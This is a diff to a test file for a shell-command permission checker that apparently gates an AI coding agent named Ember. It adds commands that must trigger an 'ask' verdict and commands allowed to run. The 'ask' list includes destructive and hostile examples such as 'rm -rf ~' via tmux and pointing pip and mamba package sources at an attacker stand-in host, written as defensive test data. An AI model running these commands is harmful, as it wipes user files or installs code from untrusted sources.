@@ -80,7 +80,7 @@ describe("a verb Ember doesn't know, of a tool it knows (commands-closed B)", ()
       "sbt 'project r' test", "tmux send-keys -t main 'git push --force' Enter", "tmux run-shell 'rm -rf ~'", "tmux new-window x", "tmux capture-pane -p",
       "tmux -c 'rm -rf ~'", "go env -w GOFLAGS=-toolexec=./x", "pip config set global.index-url http://evil.example", "deno publish", "vercel --prod",
       "pyenv exec twine upload dist/*", "asdf exec npm publish", "rbenv exec x", "nvm exec 20 x", "fnm exec x", "volta run x", "opam exec -- x",
-      "rustup run stable rm -rf build", "systemctl log-level debug", "pdflatex --shell-escape a.tex", "maturin publish"]) {
+      "rustup run stable rm -rf build", "systemctl log-level debug", "mamba config --add channels http://evil.example", "mkdocs gh-deploy", "pdflatex --shell-escape a.tex", "maturin publish"]) {
       const d = decide(cmd);
       expect(d.verdict, cmd).toBe("ask");
       expect(d.rules, cmd).toContain("unknown.verb");
@@ -90,7 +90,8 @@ describe("a verb Ember doesn't know, of a tool it knows (commands-closed B)", ()
   it("runs the verbs those tools are known to have, and announces an unknown one the user's words name with its tool (commands-closed)", () => {
     for (const cmd of ["cargo build --release", "cargo test", "cargo nextest run", "stack build", "cabal build", "mix test", "go mod tidy", "go env GOPATH",
       "pip config list", "tmux ls", "deno main.ts", "dotnet bin/app.dll", "systemctl status nginx", "pyenv versions", "vercel ls", "bazel build //...",
-      "meson setup build", "swift build", "zig build", "waf configure --prefix ~/.local"]) {
+      "meson setup build", "swift build", "zig build", "waf configure --prefix ~/.local", "micromamba list", "bundler check", "mkdocs build",
+      "lbzip2 -d big.bz2", "prove -j 4"]) {
       expect(decide(cmd).verdict, cmd).toBe("run");
     }
     expect(decide("stack exec -- hpack", { words: "run stack exec hpack" }).verdict).toBe("announce");
